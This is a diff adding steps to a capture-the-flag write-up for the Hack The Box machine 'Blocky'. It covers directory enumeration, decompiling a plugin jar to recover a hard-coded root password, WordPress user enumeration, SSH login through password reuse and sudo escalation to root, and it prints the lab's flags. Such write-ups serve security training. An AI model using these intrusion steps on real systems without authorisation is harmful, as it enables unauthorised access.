@@ -30,11 +30,111 @@
 
 // Rolling down the site there is a 'Login' button
 
-![Image 1]()
+![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/1.png)
 
 // Clicking on the login redirect us to http://10.10.10.37/wp-login.php
 
-![Image 2]()
+![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/2.png)
+
+// Lets search for some interesting files or directories with [dirsearch](https://github.com/maurosoria/dirsearch) tool (By maurosoria).
+
+    $ python3 dirsearch.py -u http://10.10.10.37/ -t 100
+-----
+
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903
+
+    Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.10.37/_21-08-12_09-31-32.txt
+
+    Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-12_09-31-32.log
+
+    Target: http://10.10.10.37/
+
+    ...
+    
+    [09:32:19] 200 -   19KB - /license.txt
+    [09:32:27] 200 -   10KB - /phpmyadmin/
+    [09:32:27] 200 -  745B  - /plugins/
+    [09:32:29] 200 -    7KB - /readme.html
+    [09:32:38] 200 -  380B  - /wiki/
+    [09:32:38] 200 -    1KB - /wp-admin/install.php
+    [09:32:38] 200 -    0B  - /wp-config.php
+    [09:32:38] 200 -    0B  - /wp-content/
+    [09:32:38] 200 -    1B  - /wp-admin/admin-ajax.php
+    [09:32:38] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
+    [09:32:39] 200 -  965B  - /wp-content/uploads/
+    [09:32:39] 200 -    0B  - /wp-cron.php
+    [09:32:39] 200 -    2KB - /wp-login.php
+    [09:32:39] 200 -   40KB - /wp-includes/
+
+    Task Completed
+
+// Found directories: /wiki/ , /plugins/ , /phpmyadmin/ , /wp-includes/ , 
+
+// /Wiki-Underconstructin , /phpmyadmin/-phpmyadmin login , /wp-includes/-Wordpress plugins
+
+// But, /plugins/ have 2 interesting files in him
+
+![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/3.png)
+
+// Its two .jar(ziped java) files , Download them
+
+    $ ls
+    BlockyCore.jar  griefprevention-1.11.2-3.1.1.298.jar
+
+// Lets unpack BlockyCore.jar
+
+    $ jar -xf BlockyCore.jar 
+    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+
+// BlockyCore.jar generated 2 directories: META-ING & com
+
+    $ tree
+    .
+    ├── BlockyCore.jar
+    ├── META-INF
+    │   └── MANIFEST.MF
+    └── com
+        └── myfirstplugin
+            └── BlockyCore.class
+
+// We can see that inside com there is another directory with file in him - 'BlockyCore.class'
+
+// tring to see the file contant failed becouse its compiled, let decompile that file with online [java decompiler tool](http://www.javadecompilers.com/result)
+
+![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/4.png)
+
+    package com.myfirstplugin;
+
+    public class BlockyCore
+    {
+        public String sqlHost;
+        public String sqlUser;
+        public String sqlPass;
+
+        public BlockyCore() {
+            this.sqlHost = "localhost";
+            this.sqlUser = "root";
+            this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+        }
+        public void onServerStart() {
+        }
+        public void onServerStop() {
+        }
+        public void onPlayerJoin() {
+            this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+        }
+        public void sendMessage(final String username, final String message) {
+        }
+    }
+
+// We have sql root credentials ! 
+
+        this.sqlUser = "root";
+        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+        
 
 // Since we know now we dilling with Wordpress CMS we can use [wpscan](https://wpscan.com/wordpress-security-scanner) to scan for vulnerabillities
 
@@ -60,17 +160,54 @@
     
     ...
 
-    [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
-     | Found By: Rss Generator (Passive Detection)
-     |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
-     |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
-     |
-     | [!] 51 vulnerabilities identified:
+    [i] User(s) Identified:
 
-// 
+    [+] notch
+     | Found By: Author Posts - Author Pattern (Passive Detection)
+     | Confirmed By:
+     |  Wp Json Api (Aggressive Detection)
+     |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+     |  Login Error Messages (Aggressive Detection)
+
+// We have username 'notch' for Wordpress 
+
+// Also can find in the main site
+
+![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blocky/5.png)
+
+// Since we have user, password and SSH service running, lets try to connect
+
+    $ ssh notch@10.10.10.37
+
+    notch@10.10.10.37's password: 
+    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+    notch@Blocky:~$ id
+    uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+// We connected !!! And have user flag
+
+    notch@Blocky:~$ cat user.txt 
+    59fee0977fb60b8a0bc6e41e751f3cd5
+
+### -----Privilleges Escalation-----
+
+// running 'sudo -l' command we can see that this user can run sudo so simple 'sudo -i' gets us root
 
 
+    notch@Blocky:~$ sudo -l
+    [sudo] password for notch: 
+    Matching Defaults entries for notch on Blocky:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+    User notch may run the following commands on Blocky:
+        (ALL : ALL) ALL
 
+    notch@Blocky:~$ sudo -i
+    root@Blocky:~# 
 
+// And the flag !
 
+    root@Blocky:~# cat root.txt 
+    0a9694a5b4d272c694679f7860f1cd5f
